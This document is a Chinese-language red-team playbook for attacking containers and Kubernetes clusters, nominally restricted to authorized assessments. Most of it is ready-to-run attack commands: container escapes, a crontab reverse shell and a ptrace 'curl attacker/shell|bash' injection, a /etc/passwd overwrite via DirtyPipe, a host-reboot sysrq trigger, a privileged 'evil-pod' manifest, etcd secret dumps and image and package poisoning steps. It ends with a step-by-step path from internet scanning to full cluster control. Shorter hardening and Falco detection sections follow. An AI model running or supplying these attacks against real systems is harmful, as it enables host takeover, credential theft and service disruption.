# KB-32 · 容器与 Kubernetes 攻防

> **目的**：授权云原生靶场 / 企业容器化环境评估中，容器逃逸、镜像污染、K8s RBAC 滥用、API Server 未授权、etcd 提取、Service Account 凭证劫持是核心研究对象。本节给出从单容器 RCE 到集群完整的容器化攻防方法论，含 8 大类逃逸、6 类 K8s 攻击、4 类供应链污染、3 类防御对抗。
>
> **使用边界**：仅在已授权容器化靶场、企业内部容器化环境审计、K8s 红蓝演练中使用。禁止对未授权集群执行。

---

## 0. 总览

| 维度 | 数量 | 关键目的 |
|------|------|----------|
| 容器逃逸 | 8 类 | 从容器内拿到宿主机 |
| K8s 攻击 | 6 类 | 从 pod 拿到集群 |
| 镜像供应链 | 4 类 | 污染镜像源 |
| 防御对抗 | 3 类 | 加固 + 检测 |
| 自动化工具 | 6 个 | kube-hunter / Peirates / CDK / Trivy / Falco |

## 信号分类

| Signal | 描述 | 触发词 |
|--------|------|--------|
| Signal C | 漏洞研究 | 容器逃逸 / CVE / RCE / 内核漏洞 |
| Signal D | 授权范围评估 | K8s / 集群 / 容器 / RBAC / etcd |
| Signal E | 专题研究 | 云原生 / DevSecOps / 镜像 / 供应链 |

---

## 1. 容器基础信息收集（容器内执行）

### 1.1 容器内识别

```bash
# 检测是否在容器中
cat /proc/1/cgroup | grep -q "docker\|kubepods" && echo "[+] 在容器内"

# 容器元信息
cat /.dockerenv 2>/dev/null && echo "Docker 容器"
ls /.containerenv 2>/dev/null && echo "Podman/CRI-O 容器"

# 容器 ID
cat /proc/self/cgroup | head -1

# 容器主机名
hostname
```

### 1.2 容器内侦察

```bash
# 1.2.1 网络信息
ip addr
ip route
cat /etc/resolv.conf
cat /etc/hosts

# 1.2.2 进程与已挂载卷
ps aux
mount | grep -E "docker|kubelet|volume"
ls -la /proc/1/root/

# 1.2.3 环境变量（K8s Secret 经常泄漏）
env | sort
# 重点关注 KUBERNETES_SERVICE_HOST / KUBERNETES_PORT / TOKEN / CA

# 1.2.4 已挂载的 K8s Service Account
ls -la /var/run/secrets/kubernetes.io/serviceaccount/

# 1.2.5 Docker Socket
ls -la /var/run/docker.sock

# 1.2.6 主机 proc/sys 挂载
mount | grep -E "proc|sys|cgroup"
```

### 1.3 容器检测工具

```bash
# Deepce - 容器逃逸检测工具
wget https://github.com/stealthcopter/deepce/releases/latest/download/deepce
chmod +x deepce && ./deepce

# CDockerKillerEx (CDK) - 国内常用
wget https://github.com/cdk-team/CDK/releases/latest/download/cdk

# amicontained - 容器内 capabilities 检测
amicontained
```

---

## 2. 容器逃逸（8 大类）

### 2.1 危险挂载逃逸

#### 2.1.1 Docker Socket 挂载

```bash
# 检查：/var/run/docker.sock
ls -la /var/run/docker.sock

# 利用：在容器内启动特权容器
docker run -it -v /:/host alpine chroot /host
# 之后在 chroot 中能拿到宿主机 root
```

#### 2.1.2 宿主机根目录挂载

```bash
# 检查
mount | grep " / "
# 如果容器内 / 实际是宿主机某目录

# 利用
ls -la /root/.ssh/
echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys
```

#### 2.1.3 cgroup 挂载

```bash
# 利用 cgroup v1 release_agent 特性
# 步骤：
# 1. mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp
# 2. 创建子 cgroup
# 3. 设置 release_agent
# 4. 在 cgroup 内触发 OOM（耗尽内存）
# 5. release_agent 在宿主机以 root 执行
```

#### 2.1.4 /proc/sysrq 触发

```bash
# 容器有 SYS_ADMIN capability 时
echo 1 > /proc/sys/kernel/sysrq
echo b > /proc/sysrq-trigger
# 立即重启宿主机
```

### 2.2 特权容器逃逸

```bash
# 检测
cat /proc/self/status | grep -i cap
# CapInh/CapPrm/CapEff 应有大量位被设置

# 利用 1：mount 设备
mkdir /tmp/host
mount /dev/sda1 /tmp/host
chroot /tmp/host
# 拿到宿主 shell

# 利用 2：写 crontab
echo '* * * * * bash -i >& /dev/tcp/attacker/443 0>&1' >> /etc/crontab
# 实际写到宿主机 /etc/crontab

# 利用 3：fdisk 直接操作磁盘
fdisk -l
# 看到宿主磁盘
```

### 2.3 Linux Capability 逃逸

```bash
# 检测 capabilities
grep Cap /proc/self/status
# CapBnd - bounding set
# CapEff - effective

# CAP_SYS_ADMIN 逃逸（mount/umount）
# CAP_DAC_READ_SEARCH - 读取任意文件
# CAP_SYS_PTRACE - ptrace 任意进程
# CAP_NET_RAW - 抓包
# CAP_SYS_MODULE - 加载内核模块

# ptrace 注入
gdb -p <host_pid> -batch -ex "call (void)system(\"bash -c 'curl http://attacker/shell|bash'\")"
```

### 2.4 内核漏洞逃逸（CVE）

```bash
# CVE-2022-0847 DirtyPipe - Linux 5.8-5.16
# 任意文件覆盖（只读文件）
./dirtypipe /etc/passwd "root::0:0:root:/root:/bin/bash"
# 直接清空 root 密码

# CVE-2021-22555 - Netfilter
# 提权 + 容器逃逸
./nft_coeaudit

# CVE-2021-4034 Polkit pkexec
# 几乎通杀
./pwnkit

# CVE-2022-0185 - fsconfig
# 容器逃逸
./fsconfig

# CVE-2022-0492 - cgroups v1
# escape via release_agent

# CVE-2024-1086 - nf_tables
# UAF 提权
```

### 2.5 Mount Namespace 逃逸

```bash
# nsenter 进入宿主机进程命名空间
nsenter -t 1 -m -u -i -n -p -- /bin/bash
# -t 1: 目标 PID（1 = init）
# -m: mount namespace
# -u: UTS namespace
# -i: IPC namespace
# -n: network namespace
# -p: PID namespace

# 容器需要 CAP_SYS_ADMIN 或 CAP_SYS_PTRACE
```

### 2.6 用户命名空间逃逸（user_namespace）

```bash
# userns + cap_sys_admin 组合
# 创建用户命名空间，映射当前用户为 root
unshare -U -r /bin/bash
# 在新命名空间内是 root
# 但实际仍是普通用户
# 通过 CVE 突破到宿主机 root
```

### 2.7 网络命名空间逃逸

```bash
# 通过共享网络命名空间
# K8s pod 默认共享 network namespace

# 同一 pod 内容器共享 network
# 旁路攻击：
nsenter -t 1 -n -- ip addr
# 看到宿主机网络

# arp spoofing 在容器内
# ip forward
# 监听宿主机流量
```

### 2.8 镜像污染逃逸

```bash
# 如果能 push 镜像到公共 registry
# 污染基础镜像
# 用户拉取后自动执行恶意代码
docker push evil-registry.com/common-image:latest
```

---

## 3. Kubernetes 攻击（6 大类）

### 3.1 未授权 API Server

```bash
# 检测
curl -k https://kubernetes.default.svc/api
curl -k https://<K8S_API_IP>:6443/api

# 如果 200/401 → API Server 可达

# 利用：匿名访问
# --insecure-skip-tls-verify 绕过证书
# 旧版本 K8s（< 1.6）默认开启匿名

# 列出所有 pods
curl -k https://<api>:6443/api/v1/namespaces/default/pods
```

### 3.2 Service Account 凭证劫持

```bash
# 默认挂载路径
ls -la /var/run/secrets/kubernetes.io/serviceaccount/

# 文件
# ca.crt - CA 证书
# namespace - 当前命名空间
# token - JWT

# 用 token 访问 API
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -k -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces
```

### 3.3 K8s RBAC 滥用

```bash
# 用 kubeconfig 列出权限
kubectl auth can-i --list -n default

# 高危 RBAC verbs:
# - create: pods/exec
# - create: pods/eviction
# - create: deployments
# - patch: clusterrolebindings

# 创建特权 pod 拿到节点
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: evil-pod
  namespace: default
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: evil
    image: alpine
    securityContext:
      privileged: true
    volumeMounts:
    - name: host-root
      mountPath: /host
  volumes:
  - name: host-root
    hostPath:
      path: /
EOF

# 然后 kubectl exec -it evil-pod -- chroot /host
```

### 3.4 etcd 提取

```bash
# etcd 默认 2379 端口
# 用 etcdctl 获取所有 secret
etcdctl --endpoints=https://127.0.0.1:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/server.crt \
  --key=/etc/kubernetes/pki/etcd/server.key \
  get / --prefix --keys-only

# 提取所有 secret
etcdctl get /registry/secrets --prefix -w json | jq

# 提取所有 configmap
etcdctl get /registry/configmaps --prefix -w json | jq
```

### 3.5 K8s 网络策略绕过

```bash
# 默认 K8s 网络策略是 allow-all
# 检查 NetworkPolicy
kubectl get networkpolicies --all-namespaces

# 没有策略 → 全通
# 横向：直接访问其他 namespace 的 pod IP

# 内部 service：
# - kubernetes.default.svc
# - kube-dns
# - dashboard
# - heapster
# - prometheus
# - grafana
```

### 3.6 K8s 组件利用

#### 3.6.1 Kubelet API（10250 端口）

```bash
# 未认证访问 Kubelet
curl -k https://<node_ip>:10250/pods
# 列出所有 pod

# 在 pod 内执行命令
curl -k -XPOST "https://<node_ip>:10250/run/<namespace>/<pod>/<container>" \
  -d "cmd=bash"

# 或者 pprof
curl -k https://<node_ip>:10250/debug/pprof
```

#### 3.6.2 Kube-dns / CoreDNS

```bash
# 嗅探 DNS 流量
tcpdump -i eth0 udp port 53 -w dns.pcap

# 提取敏感 service 解析
# 找到 internal-* / private-* / db-* / mysql-*
```

#### 3.6.3 Dashboard

```bash
# Kubernetes Dashboard 默认无认证
# https://<node_ip>:8443
# 旧版本（< 1.10）默认开启 Skip button → admin 权限
```

#### 3.6.4 Helm Tiller（旧版本）

```bash
# Helm v2 默认无认证
helm ls
# 列出所有 release
# 部署恶意 chart
helm install evil --set image=alpine ./chart
```

#### 3.6.5 Prometheus

```bash
# 默认无认证
curl http://<prometheus_ip>:9090/api/v1/query?query=...
# 提取所有 K8s 指标，包括敏感 env
# 攻击指标：kube_pod_container_info, kube_secret_info
```

---

## 4. 镜像供应链污染（4 类）

### 4.1 基础镜像污染

```bash
# Docker Hub 镜像替换
# 1. 创建同名镜像
docker build -t library/alpine:latest .
# 2. push
docker push library/alpine:latest
# 3. 用户拉取后自动执行
```

### 4.2 镜像层注入

```bash
# 解镜像
docker save alpine:latest -o alpine.tar
mkdir /tmp/alpine-extract && tar xf alpine.tar -C /tmp/alpine-extract

# 修改 layer
cd /tmp/alpine-extract/<layer>/
# 注入脚本到 /etc/crontab
# 或替换 /bin/sh
tar -cf ../new-layer.tar .
```

### 4.3 第三方库污染

```bash
# PyPI / npm 投毒
# 1. 创建同名包
# 2. 上传带后门的版本
# 3. 用户升级时自动执行

# 案例：
# - event-stream (npm)
# - ua-parser-js (npm)
# - typosquatting 包（crossenv, electrum）
```

### 4.4 CI/CD 污染

```bash
# GitHub Actions
# 1. PR 提交恶意 workflow
# 2. 改 .github/workflows/*.yml
# 3. 触发自动执行
# 案例：event-stream, codecov bash uploader
```

---

## 5. 容器化环境评估工具

### 5.1 kube-hunter

```bash
# 远程扫描
kube-hunter --remote <cluster_ip>
# 主动扫描
kube-hunter --active --remote <cluster_ip>
# 输出报告
kube-hunter --report json
```

### 5.2 Peirates

```bash
# K8s pod 内自动化提权
./peirates -i
# 交互模式
```

### 5.3 CDK

```bash
# 容器内多面手工具
./cdk evaluate
./cdk auto-escape
./cdk escape
```

### 5.4 Trivy

```bash
# 镜像漏洞扫描
trivy image alpine:3.18
trivy image --severity HIGH,CRITICAL nginx:latest
```

### 5.5 kube-bench

```bash
# CIS Kubernetes Benchmark 检测
kube-bench run --targets node
kube-bench run --targets master
```

### 5.6 kubeaudit

```bash
# K8s manifest 静态分析
kubeaudit all -f deployment.yaml
```

---

## 6. 防御对抗（3 类）

### 6.1 Pod Security Standards

```yaml
# K8s Pod Security Standards（替代 PSP）
# 在 namespace 上打标签
apiVersion: v1
kind: Namespace
metadata:
  name: my-namespace
  labels:
    pod-security.kubernetes.io/enforce: restricted
    pod-security.kubernetes.io/audit: restricted
    pod-security.kubernetes.io/warn: restricted
```

### 6.2 安全容器运行时

```yaml
# gVisor（runsc）
apiVersion: node.k8s.io/v1
kind: RuntimeClass
metadata:
  name: gvisor
handler: runsc

# 在 pod 中使用
spec:
  runtimeClassName: gvisor

# Kata Containers
# Firecracker
```

### 6.3 检测与告警

```yaml
# Falco 规则示例
- rule: Detect privileged container start
  desc: >
    Detects a privileged container starting
  condition: >
    container_started and container.privileged=true
  output: >
    Privileged container started
    (user=%user.name command=%container.cmdline image=%container.image.repository:%container.image.tag)
  priority: WARNING
  tags: [container, privileged]

# 部署 Falco
helm install falco falcosecurity/falco
```

---

## 7. 攻击路径示例（从公网到集群 root）

```
T+00:00 收集 K8s API Server 公网 IP（shodan / censys）
T+00:05 检测 :6443 / :10250 / :2379 端口
T+00:10 未授权 API Server（旧版本）
T+00:15 列出 pod / namespace / secret
T+00:20 拿到 Service Account token
T+00:25 创建特权 pod（mount 宿主机根）
T+00:30 kubectl exec -it evil-pod -- chroot /host
T+00:35 拿到宿主机 /etc/shadow
T+00:40 拿到节点 SSH key
T+00:45 横向其他节点
T+00:50 etcd 提取所有 secret
T+00:55 拿到 cluster-admin token
T+01:00 集群控制权
```

---

## 8. 报告输出模板

```markdown
# 容器化环境评估报告 - CASE-YYYY-NNNN

## 1. 环境信息
- 集群版本：v1.24.x
- 节点数 / pod 数
- CNI 插件（flannel / calico / cilium）

## 2. 关键发现

### 2.1 容器逃逸
- [ ] 危险挂载
- [ ] 特权容器
- [ ] 危险 Capability
- [ ] 内核漏洞（CVE 列表）

### 2.2 K8s 攻击面
- API Server 暴露情况
- 匿名访问
- Service Account 权限
- RBAC 高危 verbs

### 2.3 镜像供应链
- 基础镜像来源
- 第三方库风险
- CI/CD 风险

## 3. 演示路径
1. 容器内 → 宿主机
2. Pod → K8s API Server
3. K8s → 集群全控

## 4. 加固建议
- Pod Security Standards
- NetworkPolicy 默认 deny
- RuntimeClass (gVisor/Kata)
- Secret 加密（etcd + KMS）
- 镜像签名（cosign / Notary）
- Falco 检测规则
```

---

## 9. 工具清单

| 工具 | 用途 | 路径 |
|------|------|------|
| Docker | 容器运行时 | `/usr/bin/docker` |
| kubectl | K8s 客户端 | `/usr/bin/kubectl` |
| helm | K8s 包管理 | `/usr/bin/helm` |
| cdk | 容器逃逸 | `/opt/tools/cdk` |
| deepce | 容器检测 | `/opt/tools/deepce` |
| kube-hunter | 远程扫描 | `/opt/tools/kube-hunter` |
| peirates | pod 内提权 | `/opt/tools/peirates` |
| trivy | 漏洞扫描 | `/usr/bin/trivy` |
| kube-bench | CIS 检测 | `/opt/tools/kube-bench` |
| kubeaudit | manifest 审计 | `/opt/tools/kubeaudit` |
| falco | 运行时检测 | helm 安装 |
| amicontained | capability 检测 | `/opt/tools/amicontained` |

---

## 10. 防御与加固清单

- [ ] Pod Security Standards 启用（enforce: restricted）
- [ ] NetworkPolicy 默认 deny
- [ ] API Server 启用认证 + 审计
- [ ] 关闭匿名访问
- [ ] kubelet 启用认证
- [ ] etcd 启用 TLS + 加密
- [ ] 镜像签名 + 验证（cosign / Notary）
- [ ] 镜像漏洞扫描（Trivy）流水线集成
- [ ] Falco 运行时检测
- [ ] 危险 capability 禁用
- [ ] 特权容器禁止
- [ ] 容器 root 用户强制非 root
- [ ] readOnlyRootFilesystem
- [ ] 资源限制（limits）
- [ ] seccomp / AppArmor

---

*版本：v2.6.3 · 工号 RE-7X-2024 · 授权容器化环境评估专用*
